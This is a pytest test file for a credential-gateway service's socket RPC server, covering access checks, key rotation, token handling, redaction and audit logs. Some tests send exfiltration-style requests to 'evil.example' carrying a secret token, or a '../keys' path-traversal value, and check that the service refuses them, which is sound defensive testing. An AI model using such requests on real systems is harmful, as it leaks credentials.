"""The gate service's gate.sock (gate-service-v0 §3): real server, real socket, real peer credentials."""

from __future__ import annotations

import json
import os
import socket
import stat
import subprocess
import threading
import time

import httpx
import pytest

from secret_gate.crypto import b64url_decode
from secret_gate.constants import KIND_TOTP, USE_EXEC, USE_FILL, USE_HTTP, USE_OTP
from secret_gate.errors import GateError
from secret_gate.keystore import load_public_key
from secret_gate.policy import SecretPayload
from secret_gate.rpc_client import RpcClient, ServiceUnavailable
from secret_gate.rpc_protocol import MAX_REQUEST_BYTES, RemoteError, decode_request, peer_uid
from secret_gate.rpc_server import prepare_socket_path
from secret_gate.tokens import make_token
from tests.fixtures import fake_secrets as fs
from tests.service_fixtures import running_service, short_dir

SCOPE = "rpc-scope-0123456789abcdefgh"
PASSWORD = fs.PORTAL.password


def _token(svc, *, value=PASSWORD, uses=(USE_HTTP,), hosts=fs.PORTAL.hosts, label="portal-a/pass", kind="secret", **kw):
    payload = SecretPayload.create(value=value, hosts=list(hosts), uses=set(uses), label=label, kind=kind, **kw)
    return make_token(load_public_key(svc.home), payload)


def _audit(svc) -> list[dict]:
    return [json.loads(line) for line in svc.audit.read_text().splitlines()]


def test_peer_uid_is_the_kernels_record_of_the_other_end():
    a, b = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
    with a, b:
        assert peer_uid(a) == os.getuid() == peer_uid(b)


def test_socket_is_0666_and_only_allowed_uids_get_an_answer():
    with running_service() as svc:
        assert stat.S_IMODE(svc.socket.stat().st_mode) == 0o666
        assert svc.client.call("status")["version"]
    with running_service(allowed=frozenset({0})) as svc:                  # this test user is not allowed
        with pytest.raises(ServiceUnavailable, match="连接被关闭"):
            svc.client.call("status")
        assert not svc.audit.exists()                                     # refused before any request was read


def test_status_and_keys_methods_publish_and_signal_the_proxy():
    with running_service() as svc:
        status = svc.client.call("status")
        assert status["proxyPort"] == 18080 and status["runtimeVersion"] == "0.1.0+test" and status["proxyRunning"]
        assert [k["name"] for k in status["keys"]] == ["main"]
        row = svc.client.call("keys.new", {"name": "next", "use": True})
        assert row["name"] == "next" and row["current"] and not row["legacy"]
        assert svc.signals == ["HUP"]
        published = json.loads((svc.public / "keys.json").read_text())
        assert [r["name"] for r in published if r["current"]] == ["next"]
        assert svc.client.call("keys.use", {"name": "main"})["current"] is True
        assert [k["name"] for k in svc.client.call("keys.list") if k["current"]] == ["main"]
        with pytest.raises(RemoteError, match="exists"):
            svc.client.call("keys.new", {"name": "main"})
        with pytest.raises(RemoteError, match="未停用"):
            svc.client.call("keys.retire", {"name": "next"})
        with pytest.raises(RemoteError, match="参数无效"):
            svc.client.call("keys.new", {"name": "x", "use": "yes"})
        assert len(svc.signals) == 2


def test_legacy_keys_over_the_socket():
    from secret_gate.crypto import generate_keypair
    from secret_gate.keystore import save_keypair

    with running_service() as svc:
        save_keypair(svc.home / "keys" / "legacy" / "old", generate_keypair())
        with pytest.raises(RemoteError, match="已停用"):
            svc.client.call("keys.use", {"name": "old"})
        assert svc.client.call("keys.retire", {"name": "old"}) == {"retired": "old"}
        assert [k["name"] for k in svc.client.call("keys.list")] == ["main"]


def test_refs_register_and_release_match_the_cli_contract():
    with running_service() as svc:
        token = _token(svc)
        out = svc.client.call("refs.register", {"scope": SCOPE, "tokens": [token, {"token": token, "label": "ignored"}, "junk"]})
        first, second, bad = out["refs"]
        assert first["ref"].startswith("enc:ref:") and first["ref"] == second["ref"] and first["label"] == "portal-a/pass"
        assert bad == {"error": "not a token of this gate (malformed, tampered, or made for another gate)"}
        assert PASSWORD not in json.dumps(out)
        assert svc.client.call("refs.release", {"scope": SCOPE}) == {"released": 1}
        with pytest.raises(RemoteError, match="released"):
            svc.client.call("refs.register", {"scope": SCOPE, "tokens": [token]})
        with pytest.raises(RemoteError, match="invalid execution scope"):
            svc.client.call("refs.release", {"scope": "short"})


def test_credential_info_and_reissue():
    with running_service() as svc:
        totp = _token(svc, value=fs.TOTP_SECRET_B32, uses=(USE_OTP,), kind=KIND_TOTP, label="portal-a/totp",
                      seed_import_hosts=["portal-a.example.com"])
        info = svc.client.call("credential.info", {"token": totp})
        assert info["kind"] == "totp" and info["seed_import_hosts"] == ["portal-a.example.com"]
        out = svc.client.call("credential.reissue", {"token": totp, "host": "portal-a.example.com", "purpose": "totp_seed_import"})
        assert out["uses"] == ["fill", "http"] and out["token"].startswith("enc:v1:") and fs.TOTP_SECRET_B32 not in json.dumps(out)
        with pytest.raises(RemoteError, match="unexpected fields"):
            svc.client.call("credential.info", {"token": totp, "extra": 1})


def test_mcp_methods_run_inside_the_service_and_redact():
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, text=f"hello {request.content.decode()}")

    def runner(argv, **_kw):
        return subprocess.CompletedProcess(argv, 0, stdout=f"ran with {argv[-1]}", stderr="")

    client = httpx.Client(transport=httpx.MockTransport(handler))
    with running_service(http_client=lambda: client, exec_runner=runner) as svc:
        (svc.home / "exec_templates.json").write_text(json.dumps({"echo": {"argv": ["/bin/echo", "{SECRET}"]}}))
        token = _token(svc, uses=(USE_HTTP, USE_EXEC))
        assert svc.client.call("mcp.describe", {"token": token})["label"] == "portal-a/pass"
        out = svc.client.call("mcp.http", {"method": "POST", "url": "https://portal-a.example.com/login", "body": token})
        assert seen[0].content.decode() == PASSWORD                        # the site got the value
        assert out == {"status": 200, "headers": out["headers"], "body": "hello [REDACTED:portal-a/pass]"}
        assert svc.client.call("mcp.exec", {"template": "echo", "token": token})["stdout"] == "ran with [REDACTED:portal-a/pass]"
        with pytest.raises(RemoteError, match="not allowed on host"):
            svc.client.call("mcp.http", {"method": "GET", "url": f"https://evil.example/?p={token}"})
        totp = _token(svc, value=fs.TOTP_SECRET_B32, uses=(USE_OTP,), kind=KIND_TOTP, label="portal-a/totp")
        assert svc.client.call("mcp.otp", {"token": totp}).isdigit()
        ref = svc.client.call("refs.register", {"scope": SCOPE, "tokens": [token]})["refs"][0]["ref"]
        assert svc.client.call("mcp.describe", {"scope": SCOPE, "token": ref})["ref"] == ref
        with pytest.raises(RemoteError, match="no task scope"):
            svc.client.call("mcp.describe", {"token": ref})
        audit = svc.audit.read_text()
        assert PASSWORD not in audit and token not in audit and SCOPE not in audit
        lines = _audit(svc)
        http_line = next(line for line in lines if line["method"] == "mcp.http" and line["ok"])
        assert http_line["labels"] == ["portal-a/pass"] and http_line["host"] == "portal-a.example.com"
        assert {"ts", "scope", "event", "method", "uid", "ok"} <= set(lines[0])


def test_mcp_http_transport_errors_name_the_failure_only():
    def handler(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError(f"cannot reach {request.url}")

    client = httpx.Client(transport=httpx.MockTransport(handler))
    with running_service(http_client=lambda: client) as svc:
        token = _token(svc)
        with pytest.raises(RemoteError) as exc:
            svc.client.call("mcp.http", {"method": "GET", "url": f"https://portal-a.example.com/?p={token}"})
        assert str(exc.value) == "request failed (ConnectError)" and PASSWORD not in str(exc.value)


def test_mcp_repair_goes_to_the_bridge_the_caller_names():
    posted: list[dict] = []

    def bridge(request: httpx.Request) -> httpx.Response:
        body = json.loads(request.content)
        posted.append({"auth": request.headers["authorization"], **body})
        return httpx.Response(200, json={"ok": True, "token": body["token"], "label": "portal-a/totp", "kind": "secret",
                                         "hosts": [body["host"]], "uses": ["fill", "http"]})

    with running_service(repair_transport=httpx.MockTransport(bridge)) as svc:
        token = _token(svc, value=fs.TOTP_SECRET_B32, uses=(USE_OTP,), kind=KIND_TOTP, label="portal-a/totp")
        params = {"token": token, "host": "portal-a.example.com"}
        with pytest.raises(RemoteError, match="outside an active dispatcher task"):
            svc.client.call("mcp.repair", params)
        out = svc.client.call("mcp.repair", {**params, "repairUrl": "http://127.0.0.1:4799/credential-repair",
                                             "repairKey": "k" * 24})
        assert out["label"] == "portal-a/totp" and posted[0]["auth"] == "Bearer " + "k" * 24


def test_browser_resolve_is_fill_only_and_host_checked():
    with running_service() as svc:
        fill = _token(svc, uses=(USE_FILL,), label="portal-a/fill")
        http_only = _token(svc, uses=(USE_HTTP,))
        host = "login.portal-a.example.com:443"
        assert svc.client.call("browser.resolve", {"token": fill, "host": host}) == {"value": PASSWORD, "label": "portal-a/fill"}
        with pytest.raises(RemoteError, match="does not allow use 'fill'"):
            svc.client.call("browser.resolve", {"token": http_only, "host": host})
        with pytest.raises(RemoteError, match="not allowed on host"):
            svc.client.call("browser.resolve", {"token": fill, "host": "evil.example:443"})
        for bad in ("*.portal-a.example.com:443", "login.portal-a.example.com", "https://x/"):
            with pytest.raises(RemoteError, match="参数无效"):
                svc.client.call("browser.resolve", {"token": fill, "host": bad})
        ref = svc.client.call("browser.register", {"scope": SCOPE, "token": fill})["ref"]
        assert svc.client.call("browser.resolve", {"scope": SCOPE, "token": ref, "host": host})["value"] == PASSWORD
        line = next(line for line in _audit(svc) if line["method"] == "browser.resolve" and line["ok"])
        assert line["host"] == host and line["labels"] == ["portal-a/fill"] and PASSWORD not in svc.audit.read_text()


def test_browser_resolve_lets_http_tokens_of_moved_in_keys_be_typed_but_not_new_ones():
    # gate-service-v0 §1: a key moved in from the login user's home was readable there, so an http token sealed to it
    # is typed as before; tokens sealed to keys made in the service need 'fill' to leave it for the browser.
    with running_service(keys=("main", "old")) as svc:
        (svc.home / "keys" / "legacy").mkdir(mode=0o700)
        (svc.home / "keys" / "old").rename(svc.home / "keys" / "legacy" / "old")
        legacy_pub = b64url_decode((svc.home / "keys" / "legacy" / "old" / "key.pub").read_text().strip())
        payload = SecretPayload.create(value=PASSWORD, hosts=list(fs.PORTAL.hosts), uses={USE_HTTP}, label="portal-a/old", kind="secret")
        old_http = make_token(legacy_pub, payload)
        host = "login.portal-a.example.com:443"
        assert svc.client.call("browser.resolve", {"token": old_http, "host": host})["value"] == PASSWORD
        with pytest.raises(RemoteError, match="not allowed on host"):
            svc.client.call("browser.resolve", {"token": old_http, "host": "evil.example:443"})
        with pytest.raises(RemoteError, match="does not allow use 'fill'"):
            svc.client.call("browser.resolve", {"token": _token(svc, uses=(USE_HTTP,)), "host": host})


def test_browser_config_and_logs_tail():
    with running_service() as svc:
        assert svc.client.call("browser.config") == {"screenshotMask": None}
        mask = {"kinds": ["email"], "regions": {"a.example": [".card"]}}
        (svc.home / "screenshot-mask.json").write_text(json.dumps(mask))
        assert svc.client.call("browser.config") == {"screenshotMask": mask}
        (svc.home / "screenshot-mask.json").write_text(json.dumps({"bogus": 1}))
        with pytest.raises(RemoteError, match="screenshot-mask.json is invalid"):
            svc.client.call("browser.config")
        assert svc.client.call("logs.tail", {"name": "proxy"}) == {"text": ""}
        (svc.home / "logs").mkdir(exist_ok=True)
        (svc.home / "logs" / "rpc.log").write_text("".join(f"line {n}\n" for n in range(600)))
        assert svc.client.call("logs.tail", {"name": "rpc", "lines": 2}) == {"text": "line 598\nline 599"}
        for params in ({"name": "../keys"}, {"name": "rpc", "lines": 501}, {"name": "rpc", "lines": True}):
            with pytest.raises(RemoteError, match="参数无效"):
                svc.client.call("logs.tail", params)


def test_protocol_errors_are_answered_in_chinese_and_the_connection_survives():
    with running_service() as svc, socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as sock:
        sock.connect(str(svc.socket))
        reader = sock.makefile("rb")
        for line, reason in ((b"not json\n", "有效的 JSON"), (b'{"id": 1}\n', "method"),
                             (b'{"id": 2, "method": "nope"}\n', "未知方法"), (b'{"id": 3, "method": "status", "params": []}\n', "params")):
            sock.sendall(line)
            reply = json.loads(reader.readline())
            assert reply["ok"] is False and reason in reply["error"]
        sock.sendall(b'{"id": 9, "method": "status"}\n')
        assert json.loads(reader.readline())["id"] == 9


def test_requests_over_one_mebibyte_are_refused():
    with running_service() as svc, socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as sock:
        sock.connect(str(svc.socket))
        sock.sendall(b'{"id": 1, "method": "status", "params": {"x": "' + b"a" * MAX_REQUEST_BYTES + b'"}}\n')
        reply = json.loads(sock.makefile("rb").readline())
        assert reply == {"id": None, "ok": False, "error": "请求超过 1 MiB"}
    with pytest.raises(GateError, match="1 MiB"):
        RpcClient(svc.socket).call("status", {"x": "a" * MAX_REQUEST_BYTES})
    with pytest.raises(GateError, match="1 MiB"):
        decode_request(b"x" * (MAX_REQUEST_BYTES + 1))


def test_a_slow_call_does_not_hold_up_other_clients():
    release = threading.Event()
    started = threading.Event()

    def slow_runner(argv, **_kw):
        started.set()
        release.wait(10)
        return subprocess.CompletedProcess(argv, 0, stdout="done", stderr="")

    with running_service(exec_runner=slow_runner) as svc:
        (svc.home / "exec_templates.json").write_text(json.dumps({"slow": {"argv": ["/bin/true", "{SECRET}"]}}))
        token = _token(svc, uses=(USE_EXEC,))
        results: list = []
        worker = threading.Thread(target=lambda: results.append(svc.client.call("mcp.exec", {"template": "slow", "token": token})))
        worker.start()
        assert started.wait(5)
        began = time.monotonic()
        assert svc.client.call("status")["version"]                        # answered while exec is still running
        assert time.monotonic() - began < 2 and not results
        release.set()
        worker.join(5)
        assert results[0]["stdout"] == "done"


def test_stale_socket_is_replaced_but_a_live_one_or_a_file_is_not():
    with short_dir() as root:
        path = root / "gate.sock"
        stale = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        stale.bind(str(path))
        stale.close()                                                     # bound, nobody listening
        prepare_socket_path(path)
        assert not path.exists()
        path.write_text("not a socket")
        with pytest.raises(GateError, match="不是 socket"):
            prepare_socket_path(path)
    with running_service() as svc:
        with pytest.raises(GateError, match="已有服务"):
            prepare_socket_path(svc.socket)


def test_no_service_means_unavailable_never_a_local_fallback(tmp_path):
    with pytest.raises(ServiceUnavailable, match="凭据网关服务无响应"):
        RpcClient(tmp_path / "gate.sock").call("status")


def test_secret_gate_rpc_process_end_to_end():
    """`secret-gate rpc` as launchd runs it: env only, config next to the public dir, SIGTERM removes the socket."""
    import signal
    import sys

    from secret_gate.keyring import create_keypair
    from secret_gate.service_paths import ServiceConfig

    with short_dir() as root:
        home, public = root / "gate", root / "gate-public"
        home.mkdir(mode=0o700)
        public.mkdir()
        create_keypair(home, "main")
        config = ServiceConfig(owner_uid=os.getuid(), proxy_port=18081, runtime_version="t", installed_at="t")
        (root / "gate-service.json").write_text(json.dumps(config.to_json()))
        env = {**os.environ, "SECRET_GATE_HOME": str(home), "SECRET_GATE_PUBLIC": str(public)}
        proc = subprocess.Popen([sys.executable, "-m", "secret_gate.cli", "rpc"], env=env,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            for _ in range(200):
                if (public / "gate.sock").exists():
                    break
                time.sleep(0.05)
            status = RpcClient(public / "gate.sock").call("status")
            assert status["proxyPort"] == 18081 and status["proxyRunning"] is False
            assert json.loads((public / "keys.json").read_text())[0]["name"] == "main"
        finally:
            proc.send_signal(signal.SIGTERM)
            _, err = proc.communicate(timeout=10)
        assert proc.returncode == 0, err
        assert not (public / "gate.sock").exists()
        assert b"listening on" in err


def test_allowed_uids_come_from_gate_service_json(tmp_path, capsys):
    from secret_gate.rpc_server import config_loader, owner_uids
    from secret_gate.service_paths import ServiceConfig

    path = tmp_path / "gate-service.json"
    assert owner_uids(config_loader(path))() == frozenset({0})             # missing: root only
    assert "gate-service.json" in capsys.readouterr().err
    path.write_text(json.dumps(ServiceConfig(501, 8080, "v", "t").to_json()))
    assert owner_uids(config_loader(path))() == frozenset({0, 501})
    path.write_text(json.dumps({"ownerUid": 501}))
    assert owner_uids(config_loader(path))() == frozenset({0})             # invalid: root only
